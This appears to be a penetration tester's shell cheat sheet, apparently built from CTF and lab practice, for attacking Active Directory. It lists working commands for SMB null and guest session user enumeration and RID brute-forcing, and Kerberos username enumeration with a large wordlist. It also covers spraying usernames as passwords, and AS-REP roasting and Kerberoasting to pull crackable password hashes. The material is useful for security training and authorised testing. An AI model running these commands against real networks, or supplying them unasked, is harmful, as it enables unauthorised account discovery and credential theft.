```sh
# Try everytime 'guest' user.
enum4linux-ng 10.10.180.100
nxc smb 192.168.1.1  --users # null session
nxc smb 192.168.1.1 -u 'slom' -p '' --users # guest session
nxc smb 192.168.1.1 -u 'guest' -p '' --rid-brute # Get all users when you don't have creds, which works well with guest session.
rpcclient -U "" -N 172.16.5.5        --Then--> querydominfo
kerbrute userenum -d hercules.htb --dc 10.129.161.179 /snap/seclists/current/Usernames/xato-net-10-million-usernames-dup.txt -o valid_ad_users

# After having any credentials
nxc smb 10.10.180.100 -u 'guest' -p '' --users


# Try to login as with password same as the username
nxc smb soupdecode.local -u usernames.txt -p usernames.txt --no-brute --continue-on-success

# AS-REPRoasting without creds
GetNPUsers.py INLANEFREIGHT/ -dc-ip 10.129.205.35 -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/hashes.txt -no-pass 
GetNPUsers.py 'inlanefreight.local/htb-student:HTB_@cademy_stdnt!' -dc-ip 10.129.18.238 -request # with creds

# Kerberosting
nxc ldap "$DC" -u "$USER" -p "$PASSWORD" -d "$DOMAIN"  -k  --kerberoasting kerb.txt

```

